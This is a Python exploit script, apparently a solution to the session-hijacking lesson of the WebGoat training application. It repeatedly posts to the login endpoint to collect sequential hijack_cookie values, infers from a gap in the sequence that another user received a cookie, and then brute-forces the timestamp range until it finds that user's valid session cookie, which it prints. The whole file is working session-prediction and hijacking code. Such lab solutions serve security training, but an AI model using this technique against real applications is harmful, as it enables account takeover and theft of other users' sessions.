import requests
from http.cookies import SimpleCookie
import os
import sys

def get_range_cookies(session_id, host_addr, host_port):
    cookie_tmp = None

    for i in range(1, 15):
        try:
            response = requests.post(
                url=f'http://{host_addr}:{host_port}/WebGoat/HijackSession/login',
                headers={
                    'Connection': 'keep-alive',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': 'any',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': f'http://{host_addr}:{host_port}',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': f'http://{host_addr}:{host_port}/WebGoat/start.mvc',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cookie': f'JSESSIONID={session_id}'
                },
                data={
                    'username': '',
                    'password': ''
                },
                timeout=5
            )

            cookies = response.headers.get('Set-Cookie')
            if cookies:
                parsed_cookie = SimpleCookie(cookies)
                hijack_cookie = parsed_cookie.get('hijack_cookie')
                if hijack_cookie:
                    cookie = hijack_cookie.value

                    if cookie_tmp:
                        cook1 = int(cookie.split('-')[0])
                        cook2 = int(cookie_tmp.split('-')[0])
                        victim_exist = cook1 - cook2

                        if victim_exist != 1:
                            return f"{cookie_tmp}-{cookie}"

                    cookie_tmp = cookie
        except requests.RequestException as e:
            print(f"[Error] Request failed on iteration {i}: {e}")

    return None

def get_victim_session(session_id, host_addr, host_port):
    range_session = get_range_cookies(session_id, host_addr, host_port)
    if not range_session:
        print("No valid range session found.")
        return

    range_start = int(range_session.split('-')[1])
    range_end = int(range_session.split('-')[3])
    victim_cookie = int(range_session.split('-')[0]) + 1

    for i in range(range_start, range_end):
        try:
            response = requests.post(
                url=f'http://{host_addr}:{host_port}/WebGoat/HijackSession/login',
                headers={
                    'Connection': 'keep-alive',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'User-Agent': 'any',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': f'http://{host_addr}:{host_port}',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': f'http://{host_addr}:{host_port}/WebGoat/start.mvc',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cookie': f'JSESSIONID={session_id}; hijack_cookie={victim_cookie}-{i}'
                },
                data={
                    'username': '',
                    'password': ''
                },
                timeout=5
            )

            if "\"lessonCompleted\" : true" in response.text:
                print("""\

 ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░ ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
 ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░ 
   ░▒▓█▓▒░                                                                                                     
    ░▒▓██▓▒░                                                                                                   
""")

                print("==============================================================================================================")
                print(f'==> hijack_cookie={victim_cookie}-{i} <==')
                break
        except requests.RequestException as e:
            print(f"[Error] Failed to send hijack attempt for {victim_cookie}-{i}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python exploit.py <sessionId> <TARGET> <PORT>")
    else:
        session_id = sys.argv[1]
        host_addr = sys.argv[2]
        host_port = sys.argv[3]
        get_victim_session(session_id, host_addr, host_port)
